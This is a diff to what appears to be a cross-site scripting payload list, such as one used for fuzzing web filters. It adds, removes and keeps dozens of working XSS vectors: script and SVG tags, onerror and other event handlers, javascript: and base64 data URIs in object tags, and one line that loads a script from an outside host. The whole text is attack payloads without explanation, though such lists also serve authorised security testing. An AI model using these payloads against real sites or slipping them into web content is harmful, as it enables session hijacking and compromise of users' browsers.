@@ -1,10 +1,9 @@
-"'><
-</xss>
-<svg><script/==>alert(1)</script ?
+'" x=s>xss</s
+<svg><script ==>alert(1)</script ?
 <img/src/onerror=alert(1)>
-<object/data="data:text/html,<svg/onload=alert(1)>">
-<object/data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<object/data='javascript:document.write("<script src=//1.1><\/script>");'></object>
+<object data="data:text/html,<svg/onload=alert(1)>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data='javascript:document.write("<script src=//1.1><\/script>");'></object>
 <object id=x data="javascript:$('#x').html('<script>alert(1);<\/script>');">
 <form><button/formaction=javascript:alert(1)>sublimt
 <input/value=x oncut=alert(1)>
@@ -16,7 +15,6 @@
 <audio/src="x" onloadstart=alert(1)></audio>
 <video><source onerror=alert(1)>
 <svg><script/xlink:href=data::,alert(1)></script
-<body/onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
 <style><img src="</style><img src=x onerror=alert(1)//">
 <svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?"><circle r="400"></circle><animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" /></a>
 <object/data=javascript:alert(1)>
